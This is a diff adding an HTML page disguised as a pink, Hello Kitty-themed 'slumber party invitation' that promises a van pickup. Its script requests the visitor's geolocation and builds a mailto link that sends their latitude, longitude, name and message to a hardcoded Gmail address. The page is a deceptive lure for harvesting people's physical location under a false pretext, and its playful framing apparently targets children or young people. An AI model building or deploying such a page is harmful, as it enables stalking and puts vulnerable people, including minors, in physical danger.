@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Slumber Party Invitation!! LEGIT!!</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', sans-serif;
+            background-color: #ffd1dc;
+            background-size: 150px;
+            background-position: top center;
+            background-repeat: no-repeat;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 {
+            color: #ff69b4;
+            font-size: 36px;
+            text-shadow: 2px 2px #ffb6c1;
+        }
+
+        p {
+            font-size: 18px;
+            color: #6a0dad;
+            text-align: center;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: 2px solid #ff69b4;
+            border-radius: 10px;
+            font-size: 16px;
+            background-color: #fff5f8;
+        }
+
+        textarea {
+            height: 100px;
+            resize: none;
+        }
+
+        .button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #ff69b4;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 3px 3px #ffb6c1;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #ff85d5;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #6a0dad;
+        }
+
+        form {
+            width: 300px;
+            text-align: center;
+        }
+
+        #thankYouMessage {
+            display: none;
+            text-align: center;
+            font-size: 20px;
+            color: #6a0dad;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>💖 Get Party's Location 💖</h1>
+    <p>Let me know where you are! I'll send a nice cute pink van to pick you up! Tap the button to reserve your seat and leave a cute message!</p>
+    
+    <!-- Form for name and message -->
+    <form id="locationForm">
+        <input type="text" id="name" placeholder="Your Name" required>
+        <textarea id="message" placeholder="Write a cute message!" required></textarea>
+        <button type="button" class="button" onclick="sendCoordinates()">📍 RESERVE A SEAT</button>
+    </form>
+
+    <br><br><br>
+    <img src="kitpic.jpg" alt="hello kitty" width="150">
+
+    <!-- Thank You Message -->
+    <div id="thankYouMessage">
+        <h2>Thank you, I Got Your Location! 💖</h2>
+        <p>We'll send a cute pink van your way soon!</p>
+    </div>
+
+    <p class="footer">Powered by Hello Kitty Magic ✨</p>
+
+    <script>
+        function sendCoordinates() {
+            const name = document.getElementById('name').value;
+            const message = document.getElementById('message').value;
+
+            if (!name || !message) {
+                alert("Please fill out both your name and a message!");
+                return;
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const email = "aryasatyabauddha2@gmail.com"; 
+                    const subject = `${name} is reserving a seat!`;
+                    const body = `Here are my coordinates:\n\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nMessage: ${message}\n\nSent with love! 💖`;
+
+                    // Send the email using mailto
+                    window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+
+                    // Hide the form and show the thank you message
+                    document.getElementById('locationForm').style.display = 'none';
+                    document.getElementById('thankYouMessage').style.display = 'block';
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+    </script>
+
+</body>
+</html>
